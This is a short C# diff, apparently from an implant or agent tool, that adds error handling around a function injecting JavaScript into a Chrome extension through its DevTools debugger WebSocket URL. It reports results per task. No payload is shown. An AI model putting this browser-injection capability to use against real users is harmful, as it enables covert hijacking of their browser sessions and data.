@@ -76,12 +76,22 @@ namespace Agent
             {
                 ReturnOutput("Injectin.", task_id).RunSynchronously();
             }
-            response = InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl), task_id).Result;
-            if (this.config.debug)
+
+            try
             {
-                ReturnOutput("Done." + response, task_id).RunSynchronously();
+                var uri = new Uri(extension.webSocketDebuggerUrl);
+                response = InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl), task_id).Result;
+                return true;
             }
-            return true;
+            catch (Exception e)
+            {
+                if (this.config.debug)
+                {
+                    ReturnOutput("Failed to parse URI: " + extension.webSocketDebuggerUrl + e.ToString(), task_id).RunSynchronously();
+                }
+            }
+            response = "";
+            return false;
         }
         internal async Task<string> TryInjectJsAsync(ChromeJsonObject extension, string jsCode, string task_id)
         {
